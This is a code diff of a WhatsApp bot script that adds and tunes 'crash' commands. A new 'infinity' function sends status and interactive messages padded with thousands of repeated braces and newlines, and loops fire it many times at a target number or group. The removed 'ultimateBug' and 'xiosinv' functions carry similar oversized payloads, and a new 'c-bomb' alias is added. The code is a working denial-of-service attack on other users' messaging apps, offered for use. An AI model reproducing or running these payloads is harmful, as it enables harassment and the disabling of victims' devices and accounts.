@@ -350,7 +350,7 @@ async function newfc(target) {
               isForwarded: true,
               mentionedJid: ["13135550002@s.whatsapp.net"],
               externalAdReply: {
-                title: "Finix Engine",
+                title: "Viper x Gabimaru",
                 body: "",
                 thumbnailUrl: "https://example.com/",
                 mediaType: 1,
@@ -518,6 +518,43 @@ async function VanitasFC(target) {
     console.log(err);
   }
 }
+async function infinity(target) {
+    await conn.relayMessage("status@broadcast", {
+        viewOnceMessage: {
+            message: {
+                interactiveResponseMessage: {
+                    body: {
+                        text: "⏤🤡⃟‌𝗧.𝗥.𝗔.𝗦.𝗛⃟⏤‌‌@ayokunledavid‌",
+                        format: "DEFAULT"
+                    },
+                    nativeFlowResponseMessage: {
+                        name: 'galaxy_message',
+                        paramsJson: `{`.repeat(9999),
+                        version: 3
+                    },
+                    nativeFlowMessage: {
+                        messageParamsJson: "\n".repeat(10000),
+                    }
+                }
+            }
+        }
+    }, {
+        statusJidList: [target],
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{
+                    tag: "to",
+                    attrs: { jid: target },
+                    content: undefined,
+                }],
+            }],
+        }],
+    });
+}
 async function FlowXNull(target) {
   const MSG = {
     viewOnceMessage: {
@@ -553,99 +590,6 @@ async function FlowXNull(target) {
     participant: { jid: target }
   });
 }
-   async function ultimateBug(target, ptcp = true) {
-    let mentions = Array(5000).fill("6283871656842@s.whatsapp.net");
-
-    let messagePayload = {
-        viewOnceMessage: {
-            message: {
-                interactiveMessage: {
-                    header: {
-                        title: "🔥 VIPER WA CRASH 🔥",
-                        hasMediaAttachment: true
-                    },
-                    body: {
-                        text: "⚠️ WARNING: LAG INCOMING ⚠️\n" + "𓆩𓆪".repeat(50000),
-                    },
-                    nativeFlowMessage: {
-                        messageParamsJson: "{}",
-                        buttons: [
-                            {
-                                name: "cta_url",
-                                buttonParamsJson: "{\"url\":\"https://t.me/ayokunledavid\"}"
-                            },
-                            {
-                                name: "call_permission_request",
-                                buttonParamsJson: "{\"request\":\"permission\"}"
-                            }
-                        ]
-                    }
-                },
-                documentMessage: {
-                    url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
-                    mimetype: "application/pdf",
-                    fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
-                    fileLength: "9999999999999",
-                    pageCount: 999999,
-                    mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
-                    fileName: "💀 VIPER WA CRASH 💀",
-                    fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
-                    directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
-                    mediaKeyTimestamp: "1735456100",
-                    contactVcard: true,
-                    caption: "📌 *WA STRESS TEST* 📌"
-                },
-                extendedTextMessage: {
-                    text: "🚀 SYSTEM OVERLOAD 🚀\n" + mentions.join(" "),
-                    contextInfo: {
-                        mentionedJid: mentions
-                    }
-                }
-            }
-        }
-    };
-
-    await conn.relayMessage(target, messagePayload, {
-        participant: { jid: target }
-    });
-
-    console.log("Ultimate crash message sent. WhatsApp might force close.");
-}
-        async function xiosinv(bad, target) {
-            tmsg = await generateWAMessageFromContent(target, {
-                viewOnceMessage: {
-                    message: {
-                        listResponseMessage: {
-                            title: '𝙺𝚄𝙽𝙻𝙴 𝚇𝙾𝚇𝙾\n',
-                            description: "\n\n\n" + "𑪆".repeat(260000),
-                            singleSelectReply: {
-                                selectedId: "id"
-                            },
-                            listType: 1
-                        }
-                    }
-                }
-            }, {});
-
-            await bad.relayMessage("status@broadcast", tmsg.message, {
-                messageId: tmsg.key.id,
-                statusJidList: [target],
-                additionalNodes: [{
-                    tag: "meta",
-                    attrs: {},
-                    content: [{
-                        tag: "mentioned_users",
-                        attrs: {},
-                        content: [{
-                            tag: "to",
-                            attrs: { jid: target },
-                            content: undefined,
-                        }],
-                    }],
-                }],
-            });
-        }
-
         const send = async (text) => conn.sendMessage(chat, { text });
         const xreply = async (text) => conn.sendMessage(chat, {
             text,
@@ -678,14 +622,14 @@ async function FlowXNull(target) {
                 }
 
                 case "public": {
-                    if (!isCreator) return;
+                    if (!isCreator) return send("⛔ Owners Only brother");
                     xreply("Status has successfully changed to public");
                     conn.public = true;
                     break;
                 }
 
                 case "self": {
-                    if (!isCreator) return;
+                    if (!isCreator) return send("⛔ Owners Only brother");
                     xreply("Status has successfully changed to private");
                     conn.public = false;
                     break;
@@ -788,16 +732,24 @@ break
                     try {
                     for (let i = 0; i < 15; i++) {
                         await VanitasFC(target);
+                        await infinity(target);
                         await InvisibleFC(target);
                         await newfc(target);
                         await InvisibleFC(target);
                         await VanitasFC(target);
+                        await infinity(target);
                         await newfc(target);
                         await InvisibleFC(target);
                         await VanitasFC(target);
+                        await infinity(target);
                         await VanitasFC(target);
                         await InvisibleFC(target);
+                        await infinity(target);
+                        await infinity(target);
                         await newfc(target);
+                        await infinity(target);
+                        await infinity(target);
+                        await infinity(target);
                     }
                     xreply(`ᥴ᥆mmᥲᥒძ: ${command}.
                     𝗍ᥲrgᥱ𝗍: ${target}.
@@ -832,28 +784,36 @@ break
   }
   break;
                     case "xgroup":
-                    case "-group": {
+                    case "-group":
+                    case "c-bomb": {
                     if (!botNumber && !isCreator) {
                      return xreply("𝕻𝖗𝖊𝖒𝖎𝖚𝖒 𝖀𝖘𝖊𝖗𝖘 𝕺𝖓𝖑𝖞 𓂃₊ཐི༑ཋྀ˚");
                     } else {
-                    if (!isGroup) return send("‼️Gc Crash Bro, Use In A Group");
             await conn.chatModify({ archive: true}, chat);
                     try {
                     for (let i = 0; i < 15; i++) {
+                        await infinity(chat);
                         await VanitasFC(chat);
+                        await infinity(chat);
                         await InvisibleFC(chat);
                         await newfc(chat);
+                        await infinity(chat);
                         await InvisibleFC(chat);
+                        await infinity(chat);
                         await VanitasFC(chat);
                         await newfc(chat);
+                        await infinity(chat);
                         await InvisibleFC(chat);
+                        await infinity(chat);
                         await VanitasFC(chat);
                         await VanitasFC(chat);
-                        await InvisibleFC(target);
+                        await infinity(chat);
+                        await InvisibleFC(chst);
+                        await infinity(chat);
                         await newfc(chat);
                     }
                     xreply(`
-                    gr᥆ᥙ⍴: ${chat} 💥
+                    ᥴһᥲ𝗍: ${chat} 💥
                     ᥴ᥆mmᥲᥒძ: ${command} 💥
                     gr᥆ᥙ⍴ ᥒᥱᥙ𝗍rᥲᥣіzᥱძ 💥
                     ᥎і⍴ᥱr ᑲᥙg іs ᥲ 𝗍һrᥱᥲ𝗍 💥
@@ -942,6 +902,7 @@ break
 .𝗑𝖺𝗇𝖽𝗋𝗈 𝟤𝟥𝟦𝗑𝗑𝗑
 .mixed 234xxx
 .-𝗀𝗋𝗈𝗎𝗉 (𝗂𝗇 𝗀𝖼) 
+.𝖼-𝖻𝗈𝗆𝖻 (𝗂𝗇 𝖽𝗆) 
 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 𝖻𝗒 ayokunledavid.t.me
 `
                     });
